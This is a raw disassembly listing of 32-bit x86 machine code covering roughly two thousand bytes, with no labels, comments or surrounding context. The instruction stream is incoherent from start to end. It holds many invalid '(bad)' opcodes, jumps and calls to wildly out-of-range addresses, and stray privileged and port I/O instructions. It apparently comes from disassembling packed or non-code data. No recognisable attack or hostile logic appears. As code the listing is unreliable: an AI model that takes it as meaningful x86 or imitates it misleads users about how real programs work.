  42a30b:	pop    ax
  42a30d:	push   ebp
  42a30e:	rol    BYTE PTR [ebx],0xeb
  42a311:	add    DWORD PTR [ecx+0x6c0001],0x40
  42a318:	jb     0x42a36f
  42a31a:	ret    
  42a31b:	in     al,dx
  42a31c:	jecxz  0x42a2a9
  42a31e:	push   esi
  42a31f:	xchg   esp,eax
  42a320:	jne    0x42a322
  42a322:	cmp    edx,DWORD PTR [esi+0x1c]
  42a325:	jne    0x42a30b
  42a327:	mov    eax,DWORD PTR [ebp-0x77]
  42a32a:	ror    DWORD PTR [ebx+0x899408],0xe0
  42a331:	mov    esi,DWORD PTR [ebp-0x75]
  42a334:	pop    esi
  42a335:	nop
  42a336:	mov    eax,DWORD PTR [eax]
  42a338:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  42a33e:	add    al,0x0
  42a340:	inc    ebp
  42a341:	mov    eax,DWORD PTR [ebx]
  42a343:	mov    ebp,ebx
  42a345:	cmp    al,0xf
  42a347:	or     al,al
  42a349:	inc    ebp
  42a34a:	inc    ebp
  42a34b:	xor    eax,0x8bc89c8b
  42a350:	ins    BYTE PTR es:[edi],dx
  42a351:	cld    
  42a352:	add    BYTE PTR [edi+0x576c16c0],dh
  42a358:	add    BYTE PTR [ecx-0x5],dl
  42a35b:	add    eax,0x17200
  42a360:	sbb    al,0x85
  42a362:	dec    esp
  42a363:	je     0x42a39d
  42a365:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  42a369:	add    BYTE PTR [ebx],bh
  42a36b:	(bad)  
  42a36c:	and    al,0x34
  42a36e:	jae    0x42a30c
  42a370:	mov    cl,cl
  42a372:	inc    DWORD PTR [esp]
  42a375:	push   ebp
  42a376:	shr    esp,0x8
  42a379:	in     al,dx
  42a37a:	push   esp
  42a37b:	add    DWORD PTR [eax],esp
  42a37d:	add    bl,cl
  42a37f:	inc    ebp
  42a380:	mov    bh,0x53
  42a382:	add    BYTE PTR [ebp-0x17],al
  42a385:	push   esi
  42a386:	cmovne ecx,edx
  42a389:	xor    al,0x4c
  42a38b:	pushf  
  42a38c:	and    BYTE PTR [edi+0x17],dl
  42a38f:	xor    eax,0x89009cd9
  42a394:	add    ah,bh
  42a396:	sub    eax,DWORD PTR [ebp-0x3f]
  42a399:	aad    0x5
  42a39b:	inc    ebp
  42a39c:	add    eax,edx
  42a39e:	add    BYTE PTR [ebp-0x40],al
  42a3a1:	xlat   BYTE PTR ds:[ebx]
  42a3a2:	ins    BYTE PTR es:[edi],dx
  42a3a3:	inc    ebp
  42a3a4:	inc    eax
  42a3a5:	and    ecx,eax
  42a3a7:	dec    ecx
  42a3a8:	add    eax,0x202e4c45
  42a3ad:	inc    ebp
  42a3ae:	fnstcw WORD PTR [ecx+ebp*1-0x37]
  42a3b2:	add    BYTE PTR [esi+0xc000c0],bh
  42a3b8:	lea    eax,[esp-0x34]
  42a3bc:	ret    
  42a3bd:	mov    dh,0x8b
  42a3bf:	xor    edx,DWORD PTR [ecx+0x3]
  42a3c2:	mov    al,BYTE PTR [ecx+0x1]
  42a3c5:	sbb    BYTE PTR [eax],al
  42a3c7:	stc    
  42a3c8:	mov    esi,DWORD PTR [edx+0x8]
  42a3cb:	(bad)  
  42a3cc:	les    esi,FWORD PTR ss:[ecx]
  42a3cf:	(bad)  
  42a3d0:	mov    al,ch
  42a3d2:	add    esi,eax
  42a3d4:	add    dh,al
  42a3d6:	or     esi,eax
  42a3d8:	mov    dl,0xc7
  42a3da:	add    esi,eax
  42a3dc:	add    al,cl
  42a3de:	push   cs
  42a3df:	mov    BYTE PTR [edx+0xc601c9],0xca
  42a3e6:	or     BYTE PTR [ebx],dh
  42a3e8:	dec    ecx
  42a3e9:	lea    eax,[ebx]
  42a3eb:	or     eax,0x18fc0fc7
  42a3f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a3f1:	(bad)  
  42a3f3:	fiadd  WORD PTR [ebp-0x78]
  42a3f6:	jae    0xed77ab45
  42a3fc:	or     BYTE PTR [ebp+0x7],al
  42a3ff:	loope  0x42a39f
  42a401:	inc    ebp
  42a402:	xor    dl,ah
  42a404:	pop    esi
  42a405:	inc    ebp
  42a406:	shr    eax,0xc
  42a409:	inc    ebp
  42a40a:	and    ch,0x1
  42a40d:	inc    ebp
  42a40e:	add    bh,bl
  42a410:	add    BYTE PTR [ebp-0x7b],al
  42a413:	in     al,dx
  42a414:	clc    
  42a415:	inc    ebp
  42a416:	ret    0xd7
  42a419:	inc    ebp
  42a41a:	mov    edi,DWORD PTR [ecx+eax*4-0x37]
  42a41e:	sub    al,0x44
  42a420:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  42a427:	add    ebx,DWORD PTR [ecx+eax*2]
  42a42a:	(bad)  
  42a42b:	sbb    al,ah
  42a42d:	stc    
  42a42e:	test   DWORD PTR [edx-0x8],esi
  42a431:	lea    edi,[edi-0x7007aa4]
  42a437:	mov    DWORD PTR [ebp-0x24],edi
  42a43a:	(bad)  
  42a43b:	dec    ebp
  42a43c:	int3   
  42a43d:	mov    eax,0x71cdfcc6
  42a442:	mov    BYTE PTR [ecx],0xce
  42a445:	(bad)  
  42a446:	(bad)  
  42a447:	dec    edi
  42a449:	jmp    FWORD PTR [edx-0x38]
  42a44c:	(bad)  
  42a44d:	or     dl,al
  42a44f:	jge    0x42a417
  42a451:	(bad)  
  42a452:	shl    esp,1
  42a454:	xor    eax,DWORD PTR [ebp+0x45cbf85a]
  42a45a:	add    BYTE PTR [ebx+0xd8c8d],cl
  42a460:	rdpmc  
  42a462:	sbb    BYTE PTR [edi+0x7de08da],bh
  42a468:	mov    BYTE PTR [esi+0x39063283],bl
  42a46e:	in     eax,dx
  42a46f:	cmovne ebx,DWORD PTR [edx]
  42a472:	jecxz  0x42a474
  42a474:	inc    ebp
  42a475:	mov    esp,ecx
  42a477:	sbb    al,0x45
  42a479:	mov    ebx,edx
  42a47b:	add    DWORD PTR [ebp+0x0],eax
  42a47e:	out    dx,al
  42a47f:	add    DWORD PTR [ebp+0x4d],eax
  42a482:	and    DWORD PTR [ebx+0x2e8045],ecx
  42a488:	inc    ebp
  42a489:	mov    DWORD PTR [edx+ebp*2-0x37],edi
  42a48d:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d4
  42a495:	inc    ebp
  42a496:	add    ebx,edi
  42a498:	inc    ecx
  42a499:	xlat   BYTE PTR ds:[ebx]
  42a49a:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  42a4a0:	(bad)  
  42a4a1:	xor    bh,BYTE PTR [eax+eax*4+0x8bd35c6]
  42a4a8:	(bad)  
  42a4a9:	dec    esi
  42a4aa:	mov    esi,0xbf45c6f3
  42a4af:	mov    esi,eax
  42a4b1:	fadd   st,st(0)
  42a4b3:	inc    esi
  42a4b5:	(bad)  
  42a4b6:	rcl    esp,0xc6
  42a4b9:	inc    edx
  42a4bb:	push   eax
  42a4bc:	mov    BYTE PTR [ebp-0x3d],0x33
  42a4c0:	xor    eax,DWORD PTR [ebx]
  42a4c2:	lea    edx,[eax+0xd]
  42a4c5:	inc    ebp
  42a4c6:	jae    0x8c1d0ae4
  42a4cc:	ficomp WORD PTR [eax+ecx*4]
  42a4cf:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  42a4d6:	test   esi,edi
  42a4d8:	(bad)  
  42a4d9:	(bad)  
  42a4da:	inc    DWORD PTR [eax]
  42a4dc:	inc    ebp
  42a4dd:	add    BYTE PTR [ebx-0x10aa23d0],cl
  42a4e3:	mov    edx,DWORD PTR [ebx]
  42a4e5:	cld    
  42a4e6:	mov    edi,ecx
  42a4e8:	mov    ecx,ebx
  42a4ea:	pop    esp
  42a4eb:	sar    edi,0x1e
  42a4ee:	cmp    ebp,esi
  42a4f0:	jne    0x42a565
  42a4f2:	mov    DWORD PTR ds:0x22450be4,ecx
  42a4f8:	loop   0x42a4e8
  42a4fa:	pushf  
  42a4fb:	jae    0x42a488
  42a4fd:	add    eax,0x3388e91c
  42a502:	add    esi,ebp
  42a504:	add    BYTE PTR [ebx-0x40],dh
  42a507:	jmp    0x93a563
  42a50c:	mov    ebx,0x6a7275
  42a511:	pop    ecx
  42a512:	add    DWORD PTR [ebp+eax*4-0x77],esi
  42a516:	add    bh,BYTE PTR [eax+0x0]
  42a519:	dec    DWORD PTR [ebp+0x66]
  42a51c:	mov    ecx,DWORD PTR [ebp-0xff0084]
  42a522:	mov    DWORD PTR [edx-0x75],ebp
  42a525:	data16 sbb al,0x8d
  42a528:	mov    edi,edi
  42a52a:	add    edi,edi
  42a52c:	add    BYTE PTR [edx+0x1],ch
  42a52f:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  42a536:	call   0xd8906ca1
  42a53b:	push   0xffffffec
  42a53d:	pop    ecx
  42a53e:	jl     0x42a4c9
  42a540:	inc    ebp
  42a541:	sbb    BYTE PTR [esi-0x37],0x8
  42a545:	test   edx,ecx
  42a547:	(bad)  
  42a548:	jmp    0x41032e4c
  42a54d:	push   ebp
  42a54e:	jne    0x42a5b6
  42a550:	lea    ecx,[ebp-0x2c]
  42a553:	mov    DWORD PTR [ebp-0x200158],0xfe4585d4
  42a55d:	into   
  42a55e:	(bad)  
  42a55f:	jmp    0x42a4ec
  42a561:	(bad)  
  42a562:	loopne 0x42a514
  42a564:	(bad)  
  42a565:	rol    ebx,cl
  42a567:	call   0xdf5eeaf7
  42a56c:	shr    cl,0x50
  42a56f:	inc    bp
  42a571:	inc    ebp
  42a572:	mov    eax,ebp
  42a574:	cwde   
  42a575:	mov    DWORD PTR [eax],0xd4ffc7d4
  42a57b:	add    bh,bh
  42a57d:	add    BYTE PTR [ecx],al
  42a57f:	call   0x141bd84
  42a584:	inc    DWORD PTR [ebp-0xb201f8]
  42a58a:	xor    eax,DWORD PTR [ebp-0xc401fd]
  42a590:	jne    0x42a51d
  42a592:	mov    eax,ds:0x33c70be0
  42a597:	ret    
  42a598:	out    dx,eax
  42a599:	mov    edx,DWORD PTR ds:0xbc0a31c
  42a59f:	push   eax
  42a5a0:	xor    eax,DWORD PTR [ebp-0x71]
  42a5a3:	mov    esi,DWORD PTR [edx-0x68]
  42a5a6:	mov    ds:0x33ff0b00,eax
  42a5ab:	(bad)  
  42a5ac:	mov    ecx,0x8b8d0008
  42a5b1:	call   FWORD PTR [edi+edi*8]
  42a5b4:	and    bh,bh
  42a5b6:	push   0x66
  42a5b8:	mov    bp,0xff8d
  42a5bc:	(bad)  
  42a5bd:	(bad)  
  42a5be:	dec    DWORD PTR [edi]
  42a5c0:	mov    DWORD PTR [edx],eax
  42a5c2:	jp     0x42a5c4
  42a5c4:	(bad)  
  42a5c5:	mov    ecx,0x774f59
  42a5ca:	mov    ecx,eax
  42a5cc:	jl     0x42a557
  42a5ce:	dec    DWORD PTR [eax-0x74c73fa7]
  42a5d4:	mov    DWORD PTR [esi+0x7e],esp
  42a5d7:	push   ebp
  42a5d8:	dec    DWORD PTR [ebp-0x7676f2a7]
  42a5de:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  42a5e6:	xor    ecx,DWORD PTR [ebp-0x7627ec77]
  42a5ec:	call   DWORD PTR [eax+0x668dc233]
  42a5f2:	test   al,0x55
  42a5f4:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  42a5fa:	int3   
  42a5fb:	xchg   esp,eax
  42a5fc:	loopne 0x42a587
  42a5fe:	(bad)  
  42a5ff:	xchg   esi,eax
  42a600:	lods   al,BYTE PTR ds:[esi]
  42a601:	ret    0x8bd3
  42a604:	in     eax,dx
  42a605:	inc    bp
  42a607:	dec    ebp
  42a608:	loop   0x42a5c3
  42a60a:	ds dec edi
  42a60c:	mov    DWORD PTR [eax],0x89eaf1b4
  42a612:	loope  0x42a678
  42a614:	(bad)  
  42a615:	(bad)  
  42a616:	mov    eax,0x85667c8b
  42a61b:	mov    ch,0xfe
  42a61d:	(bad)  
  42a61e:	(bad)  
  42a61f:	inc    DWORD PTR [eax]
  42a621:	jno    0x42a623
  42a623:	data16 mov bl,0xb5
  42a626:	add    bh,bh
  42a628:	mov    edi,edi
  42a62a:	fmul   QWORD PTR [ecx-0x729501]
  42a630:	aam    0x8d
  42a632:	call   ebx
  42a634:	push   eax
  42a635:	mov    DWORD PTR [ebp+0x6c],eax
  42a638:	xor    edi,edi
  42a63a:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  42a640:	sub    DWORD PTR [esi+0x44],0xffffffff
  42a644:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  42a64a:	add    DWORD PTR [eax+0x0],esi
  42a64d:	push   DWORD PTR [eax]
  42a64f:	push   bp
  42a651:	lea    ecx,[ebp-0x8701]
  42a657:	mov    DWORD PTR [ecx+0x74],edx
  42a65a:	sar    bh,1
  42a65c:	or     DWORD PTR [ebx-0x48000386],0x77
  42a663:	fs test edi,edi
  42a666:	add    al,0x33
  42a668:	add    BYTE PTR [ebx],al
  42a66a:	adc    dh,BYTE PTR [ebx]
  42a66c:	add    BYTE PTR [esi-0x75],ah
  42a66f:	test   DWORD PTR [esi-0x1],esp
  42a672:	inc    ebp
  42a673:	inc    DWORD PTR [ebx-0x2ff00abb]
  42a679:	dec    ebp
  42a67a:	mov    DWORD PTR [ebx],esi
  42a67c:	mov    al,BYTE PTR [ebx]
  42a67e:	push   ecx
  42a67f:	xor    esp,DWORD PTR [esi+0x66]
  42a682:	push   ebp
  42a683:	inc    ebp
  42a684:	xor    DWORD PTR [ebx],0x8
  42a687:	mov    WORD PTR [ebp-0x72],ax
  42a68b:	push   cx
  42a68d:	inc    ebp
  42a68e:	adc    WORD PTR [ebp-0x64],0xff83
  42a693:	mov    DWORD PTR [ebx],0x92b589f8
  42a699:	clc    
  42a69a:	push   ecx
  42a69b:	inc    ebp
  42a69c:	data16 cmc 
  42a69e:	push   ebp
  42a69f:	pushf  
  42a6a0:	data16 (bad) 
  42a6a2:	dec    ebp
  42a6a3:	in     al,0x83
  42a6a5:	test   DWORD PTR [edi-0x76ba3508],eax
  42a6ab:	xor    ebx,DWORD PTR [eax+0xc7329c]
  42a6b1:	in     al,0x8b
  42a6b3:	add    eax,0x45b5f866
  42a6b8:	dec    DWORD PTR [ebx+0xf094ff]
  42a6be:	mov    DWORD PTR [ecx+0x45fff466],ecx
  42a6c4:	lea    ecx,[ebx-0x4e76e3b3]
  42a6ca:	push   0x6600ff01
  42a6cf:	push   cs
  42a6d0:	test   DWORD PTR [eax+0xff01ff],eax
  42a6d6:	inc    ecx
  42a6d7:	inc    ebp
  42a6d8:	mov    WORD PTR [ebp-0x360018],ax
  42a6df:	push   cs
  42a6e0:	shl    BYTE PTR [ebp+0x66],0x8b
  42a6e4:	test   DWORD PTR [edi+edi*8],ebx
  42a6e7:	cs (bad) 
  42a6e9:	inc    DWORD PTR [ecx-0x75]
  42a6ec:	data16 in al,dx
  42a6ee:	test   DWORD PTR [eax],ecx
  42a6f0:	inc    DWORD PTR [eax]
  42a6f2:	inc    DWORD PTR [ecx-0x77]
  42a6f5:	mov    esi,DWORD PTR [edx-0x77]
  42a6f8:	call   FWORD PTR [eax]
  42a6fa:	leavew 
  42a6fc:	xchg   ebp,eax
  42a6fd:	inc    edi
  42a6fe:	push   DWORD PTR [ebp-0x1]
  42a701:	call   0xff52924b
  42a706:	lea    eax,[ebp-0x1]
  42a709:	mov    edi,edi
  42a70b:	enter  0xc7,0xc3
  42a70f:	mov    eax,ecx
  42a711:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  42a717:	sbb    al,0x8b
  42a719:	sbb    esp,edi
  42a71b:	dec    ebp
  42a71c:	mov    bh,0x8b
  42a71e:	mov    ah,cl
  42a720:	mov    DWORD PTR [eax],0x8bc1ffc3
  42a726:	mov    eax,ebx
  42a728:	mov    BYTE PTR [eax],al
  42a72a:	sar    bh,0x89
  42a72d:	sub    BYTE PTR [eax-0x77ff766c],cl
  42a733:	mov    esp,DWORD PTR [ebp+0x7c]
  42a736:	add    BYTE PTR [eax],al
  42a738:	inc    ebp
  42a739:	mov    esi,DWORD PTR ds:0xc7049c8d
  42a73f:	or     ah,bl
  42a741:	add    BYTE PTR [ebp+0x458bf800],0x85
  42a748:	xor    DWORD PTR [edi],ecx
  42a74a:	pushf  
  42a74b:	js     0x42a714
  42a74d:	add    al,dh
  42a74f:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  42a755:	inc    eax
  42a756:	xor    eax,0x8b209f89
  42a75b:	call   FWORD PTR [ebx+ecx*4]
  42a75e:	cmp    al,0x1
  42a761:	mov    DWORD PTR [eax],0x8b8545c3
  42a767:	call   FWORD PTR [edi+edi*8]
  42a76a:	dec    ebp
  42a76b:	inc    ebp
  42a76c:	mov    eax,DWORD PTR [ebx-0xffe374]
  42a772:	mov    eax,DWORD PTR [eax]
  42a774:	mov    eax,edi
  42a776:	nop
  42a777:	ret    
  42a778:	add    BYTE PTR [ebp-0x130077],al
  42a77e:	jne    0x42a705
  42a780:	test   edi,edi
  42a782:	jne    0x42a783
  42a784:	dec    DWORD PTR [ebx-0x38aa1fe8]
  42a78a:	call   0xffcea452
  42a78f:	sbb    al,0x45
  42a791:	stos   BYTE PTR es:[edi],al
  42a792:	mov    eax,DWORD PTR [eax]
  42a794:	mov    edx,DWORD PTR [eax+0x3]
  42a797:	inc    ebp
  42a798:	cmp    al,0x8b
  42a79a:	push   cs
  42a79b:	cwde   
  42a79c:	inc    ebp
  42a79d:	add    BYTE PTR [ebp-0xe78b39],al
  42a7a3:	call   FWORD PTR [esp+eax*1]
  42a7a6:	test   eax,0x8bffff00
  42a7ab:	mov    DWORD PTR [esp+eiz*4],ebx
  42a7ae:	adc    BYTE PTR [ebp+0x1],0x8b
  42a7b2:	add    al,ch
  42a7b4:	add    al,dh
  42a7b6:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  42a7bd:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  42a7c3:	inc    ebp
  42a7c4:	add    DWORD PTR [ebx-0x7aceb000],ecx
  42a7ca:	cmp    bh,0x1
  42a7cd:	inc    DWORD PTR [eax]
  42a7cf:	inc    ebp
  42a7d0:	push   eax
  42a7d1:	xor    ebp,ecx
  42a7d3:	add    eax,DWORD PTR [edx]
  42a7d5:	mov    DWORD PTR [eax],eax
  42a7d7:	and    al,0x80
  42a7d9:	inc    DWORD PTR [ecx]
  42a7db:	lea    eax,[eax]
  42a7dd:	pushf  
  42a7de:	or     BYTE PTR [ebp-0xfe00bb],al
  42a7e4:	jmp    0x141aa6e
  42a7e9:	dec    DWORD PTR [esi]
  42a7eb:	mov    ecx,ecx
  42a7ed:	loopne 0x42a774
  42a7ef:	mov    DWORD PTR [edx],0x4d8b00c3
  42a7f5:	sbb    al,0x8b
  42a7f7:	out    dx,al
  42a7f8:	mov    eax,DWORD PTR [eax]
  42a7fa:	push   eax
  42a7fb:	push   eax
  42a7fc:	test   DWORD PTR [ebp-0x1],eax
  42a7ff:	mov    edi,edi
  42a801:	cwde   
  42a802:	inc    ebp
  42a803:	add    BYTE PTR [ebx],dh
  42a805:	mov    DWORD PTR [ebx],0x24ff8918
  42a80b:	add    al,0xff
  42a80d:	add    BYTE PTR [ebx-0x5ae30f77],cl
  42a813:	(bad)  
  42a814:	(bad)  
  42a815:	(bad)  
  42a816:	(bad)  
  42a817:	push   DWORD PTR [ebx]
  42a819:	or     BYTE PTR [ebx],al
  42a81b:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  42a822:	(bad)  
  42a823:	cld    
  42a824:	sbb    BYTE PTR [ebx+0x765050ff],al
  42a82a:	inc    ebp
  42a82b:	mov    esi,DWORD PTR [ebx]
  42a82d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a82e:	add    ecx,esi
  42a830:	push   eax
  42a831:	mov    BYTE PTR [ebp+0x4d],0x5
  42a835:	jmp    0x42a837
  42a837:	mov    eax,DWORD PTR [eax]
  42a839:	clc    
  42a83a:	mov    ecx,DWORD PTR [esp+ebx*1]
  42a83d:	inc    DWORD PTR [eax+0x5501fc]
  42a843:	mov    BYTE PTR [ebp-0xe70075],al
  42a849:	cmp    eax,DWORD PTR [eax]
  42a84b:	push   eax
  42a84c:	add    cl,ch
  42a84e:	xor    BYTE PTR [esi+0x4d],cl
  42a851:	add    edi,edi
  42a853:	mov    ecx,DWORD PTR [eax]
  42a855:	mov    al,ds:0x8b8b004d
  42a85a:	mov    ebp,DWORD PTR [ebx]
  42a85c:	hlt    
  42a85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a85e:	add    dh,al
  42a860:	add    DWORD PTR [ebp+0x45],edx
  42a863:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  42a869:	dec    ebp
  42a86a:	inc    eax
  42a86b:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  42a871:	add    BYTE PTR [ebx-0x38162400],cl
  42a877:	add    bl,al
  42a879:	add    BYTE PTR [ebp-0x2e003e],al
  42a87f:	mov    DWORD PTR [ebp-0x10],eax
  42a882:	mov    DWORD PTR [ebp+0x28],esp
  42a885:	push   eax
  42a886:	dec    DWORD PTR [ecx+0x5518e88d]
  42a88c:	dec    DWORD PTR [ecx+0x5545f050]
  42a892:	xor    ecx,DWORD PTR [edi]
  42a894:	add    edx,DWORD PTR [edx]
  42a896:	push   eax
  42a897:	xchg   ebp,eax
  42a898:	inc    ebp
  42a899:	inc    DWORD PTR ds:0xe200ff
  42a89f:	jnp    0x8097c4a5
  42a8a5:	mov    eax,DWORD PTR [ecx]
  42a8a7:	pusha  
  42a8a8:	add    bh,bh
  42a8aa:	test   ecx,eax
  42a8ac:	dec    DWORD PTR [edi+edi*8]
  42a8af:	ret    0x8d00
  42a8b2:	add    bh,bh
  42a8b4:	mov    ch,0xd7
  42a8b6:	(bad)  
  42a8b7:	cli    
  42a8b8:	inc    DWORD PTR [ebp+0x2255f830]
  42a8be:	test   DWORD PTR [ebp+0x74],ecx
  42a8c1:	add    ecx,DWORD PTR [ebx+0x65a01889]
  42a8c7:	or     BYTE PTR [eax],al
  42a8c9:	cmp    DWORD PTR [eax+0x74],edi
  42a8cc:	add    BYTE PTR [ebx+0x114dfc23],cl
  42a8d2:	sub    eax,DWORD PTR [eax]
  42a8d4:	mov    ecx,DWORD PTR [ebp-0x77]
  42a8d7:	mov    eax,edi
  42a8d9:	add    DWORD PTR [ebx],eax
  42a8db:	inc    ebp
  42a8dc:	dec    ebp
  42a8dd:	mov    ecx,DWORD PTR [edx+0x45450118]
  42a8e3:	add    cl,BYTE PTR [ebx+0x875fc4d]
  42a8e9:	mov    ecx,DWORD PTR [ebp-0xc]
  42a8ec:	inc    eax
  42a8ed:	push   ebp
  42a8ee:	push   ecx
  42a8ef:	mov    esi,DWORD PTR [edx-0x14]
  42a8f2:	mov    edx,DWORD PTR [ecx+0xce003c]
  42a8f8:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  42a8ff:	add    al,0x55
  42a901:	push   ebp
  42a902:	add    ecx,DWORD PTR [ecx-0x2d030777]
  42a908:	push   ecx
  42a909:	test   DWORD PTR [ebx],eax
  42a90b:	dec    DWORD PTR [ecx+0x554518ff]
  42a911:	mov    edi,eax
  42a913:	sbb    al,0xec
  42a915:	inc    DWORD PTR [eax]
  42a917:	mov    DWORD PTR [eax],0xff8318
  42a91d:	add    al,0x83
  42a91f:	add    al,bh
  42a921:	mov    ebp,edx
  42a923:	push   eax
  42a924:	push   ebp
  42a925:	test   DWORD PTR [edi+edi*8-0x73],esi
  42a929:	dec    DWORD PTR [eax]
  42a92b:	inc    ebp
  42a92c:	push   ebp
  42a92d:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  42a933:	and    al,0x8b
  42a935:	(bad)  
  42a936:	call   0x89df60c8
  42a93b:	test   DWORD PTR [eax-0x1],esp
  42a93e:	(bad)  
  42a93f:	inc    DWORD PTR [ecx+0xffff85]
  42a945:	dec    DWORD PTR [ecx-0x6a1f5f75]
  42a94b:	(bad)  
  42a94c:	inc    ebx
  42a94e:	dec    DWORD PTR [ebx-0x117ee316]
  42a954:	bound  eax,QWORD PTR [eax]
  42a956:	int    0x50
  42a958:	xor    eax,DWORD PTR [ebp-0x7f]
  42a95b:	mov    esi,DWORD PTR [edx]
  42a95d:	cwde   
  42a95e:	pushf  
  42a95f:	add    BYTE PTR [ebp-0x1],dh
  42a962:	mov    edi,edi
  42a964:	mov    al,ds:0x4d45ce08
  42a969:	inc    DWORD PTR [ebx]
  42a96b:	adc    al,0x83
  42a96d:	add    BYTE PTR [eax],0x1
  42a970:	adc    BYTE PTR [eax],al
  42a972:	push   ebp
  42a973:	inc    ebp
  42a974:	add    edi,edi
  42a976:	mov    edx,DWORD PTR [eax]
  42a978:	mov    ecx,DWORD PTR [ebp-0x60]
  42a97b:	push   esi
  42a97c:	adc    al,0x8
  42a97e:	mov    edx,DWORD PTR [ebp-0x8]
  42a981:	mov    ecx,DWORD PTR [ebp-0x4]
  42a984:	add    DWORD PTR [ebp-0x18],0xffffff8d
  42a988:	inc    DWORD PTR [eax+esi*8]
  42a98b:	inc    ebp
  42a98c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a98d:	mov    edx,DWORD PTR [ebp+0x1c]
  42a990:	add    DWORD PTR [ebp-0x14],eax
  42a993:	mov    edx,DWORD PTR [ebp-0x70]
  42a996:	cmp    eax,DWORD PTR [eax]
  42a998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a999:	mov    eax,DWORD PTR [eax]
  42a99b:	sbb    al,0x73
  42a99d:	add    BYTE PTR [ebx],0x1
  42a9a0:	hlt    
  42a9a1:	add    BYTE PTR [eax+0x30],dl
  42a9a4:	mov    DWORD PTR [ecx],esi
  42a9a6:	hlt    
  42a9a7:	pop    ds
  42a9a8:	inc    ebp
  42a9a9:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  42a9af:	(bad)  
  42a9b0:	push   DWORD PTR [edi]
  42a9b2:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  42a9b8:	push   DWORD PTR [ebx-0x1]
  42a9bb:	mov    eax,DWORD PTR [ebp-0x740075]
  42a9c1:	sub    eax,DWORD PTR [eax]
  42a9c3:	add    eax,DWORD PTR [eax]
  42a9c5:	mov    DWORD PTR [ecx+0x5f],eax
  42a9c8:	mov    DWORD PTR [ebx+0x20],ebx
  42a9cb:	ret    0xff
  42a9ce:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  42a9d4:	ret    
  42a9d5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  42a9db:	add    BYTE PTR [ebp-0x7d],al
  42a9de:	mov    DWORD PTR [eax],eax
  42a9e0:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  42a9e7:	sar    bh,cl
  42a9e9:	test   BYTE PTR [eax+0x1],dl
  42a9ec:	inc    ebp
  42a9ed:	add    BYTE PTR [ebx],dh
  42a9ef:	test   BYTE PTR [ebx],0x84
  42a9f2:	push   eax
  42a9f3:	add    BYTE PTR [ebp+0x0],al
  42a9f6:	add    eax,0x86
  42a9fb:	add    BYTE PTR [ebx-0x7f7be340],cl
  42aa01:	add    BYTE PTR [ecx],al
  42aa03:	add    BYTE PTR [eax],al
  42aa05:	mov    esi,0x550030
  42aa0a:	mov    ecx,DWORD PTR [edi]
  42aa0c:	sbb    al,0xda
  42aa0e:	jne    0x42aa10
  42aa10:	mov    edi,DWORD PTR [ecx]
  42aa12:	xor    BYTE PTR [eax+eax*1],0x84
  42aa16:	add    eax,DWORD PTR [eax]
  42aa18:	cld    
  42aa19:	add    BYTE PTR [ebp-0x4f],dh
  42aa1c:	mov    eax,DWORD PTR [ecx]
  42aa1e:	cld    
  42aa1f:	add    BYTE PTR [ecx-0x1bff009b],cl
  42aa25:	retf   0xe45
  42aa28:	add    eax,edx
  42aa2a:	sbb    al,0xb7
  42aa2c:	dec    ebp
  42aa2d:	or     al,0x89
  42aa2f:	dec    ebp
  42aa30:	sbb    al,0xf
  42aa32:	inc    ebp
  42aa33:	dec    eax
  42aa34:	mov    eax,DWORD PTR [ebx]
  42aa36:	sbb    al,0xf
  42aa38:	nop
  42aa39:	scas   al,BYTE PTR es:[edi]
  42aa3a:	add    DWORD PTR [eax],eax
  42aa3c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  42aa42:	mov    eax,gs
  42aa44:	add    bh,bh
  42aa46:	mov    edi,edi
  42aa48:	cmp    DWORD PTR [edi+0x72],edx
  42aa4b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  42aa51:	gs cmp al,0x0
  42aa54:	je     0x42aa2c
  42aa56:	push   eax
  42aa57:	sar    BYTE PTR [eax],1
  42aa59:	mov    bh,0x3e
  42aa5b:	push   cs
  42aa5c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  42aa62:	add    DWORD PTR [ecx+0x12],ebp
  42aa65:	dec    edx
  42aa66:	(bad)  
  42aa67:	mov    eax,edx
  42aa69:	in     al,dx
  42aa6a:	adc    DWORD PTR [ecx],esi
  42aa6c:	pop    esi
  42aa6d:	inc    ecx
  42aa6e:	leave  
  42aa6f:	or     DWORD PTR [eax],ebx
  42aa71:	gs push ebp
  42aa73:	add    ah,ch
  42aa75:	into   
  42aa76:	in     al,dx
  42aa77:	enter  0xb756,0xf0
  42aa7b:	push   cs
  42aa7c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  42aa86:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  42aa8c:	jnp    0x74432f94
  42aa92:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  42aa98:	add    BYTE PTR [edi],cl
  42aa9a:	mov    edi,DWORD PTR [ecx-0x78]
  42aa9d:	ltr    WORD PTR [ecx-0x7b]
